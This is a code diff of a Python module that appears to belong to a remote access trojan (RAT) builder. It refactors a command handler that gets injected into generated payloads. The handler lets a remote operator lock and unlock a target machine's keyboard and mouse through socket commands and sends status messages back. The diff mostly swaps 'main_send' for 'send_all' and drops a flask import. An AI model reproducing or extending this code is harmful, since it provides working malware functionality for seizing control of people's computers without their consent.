@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -53,27 +52,27 @@ def interface_locker(data):
     global keylock
     global mouselock
     if data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key' and keylock:
-        main_send('[-]Keyboard is already locked', s)
+        send_all(s,'[-]Keyboard is already locked')
     elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse' and mouselock:
-        main_send('[-]Mouse is already locked', s)
+        send_all(s,'[-]Mouse is already locked')
     elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key':
         keylock = True
         t = threading.Thread(target=key_lock,args=(),)
         t.start()
-        main_send('[+]Locked keyboard interface', s)
+        send_all(s,'[+]Locked keyboard interface')
     elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse':
         mouselock = True
         t = threading.Thread(target=mouse_lock,args=(),)
         t.start()
-        main_send('[+]Locked mouse interface', s)
+        send_all(s,'[+]Locked mouse interface')
     elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'key':
         keylock = False
-        main_send('[+]Unlocked keyboard interface', s)
+        send_all(s,'[+]Unlocked keyboard interface')
     elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'mouse':
         mouselock = False
-        main_send('[+]Unlocked mouse interface', s)
+        send_all(s,'[+]Unlocked mouse interface')
     else:
-        main_send('[-]Please specify valid interface, key/mouse, to lock/unlock', s)''')
+        send_all(s,'[-]Please specify valid interface, key/mouse, to lock/unlock')''')
         config.logics.append('''
             elif command in ('inter_lock','inter_unlock'):
                 interface_locker(data)''')
